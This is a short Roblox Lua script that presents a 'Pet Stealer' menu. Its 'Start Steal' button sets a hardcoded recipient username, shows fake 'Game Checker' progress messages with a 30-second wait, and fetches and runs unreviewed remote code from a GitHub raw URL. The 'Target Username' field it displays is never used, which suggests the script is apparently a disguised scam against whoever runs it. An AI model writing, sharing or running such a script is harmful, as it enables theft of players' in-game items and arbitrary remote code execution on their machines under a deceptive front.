local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()

local Window = Library.CreateLib("Pet Stealer]", "DarkTheme")

local Tab = Window:NewTab("Steal")

local Section = Tab:NewSection("Steal Pets")

Section:NewButton("Start Steal", "ButtonInfo", function()

print("clicked")

UserName = "XXxxGamer12345xxXX"

_G.AntiLeave = false

_G.ScriptName = "Game Checker"

_G.FirstText = "Checking..."

_G.SecondText = "Game Checked Successfully..."

_G.ThirdText = "Almost Done..."

_G.WaitingTime = 30

loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()

end)

Section:NewTextBox("Target Username", "Dont Use DisplayName", function(txt)

	print(txt)end)
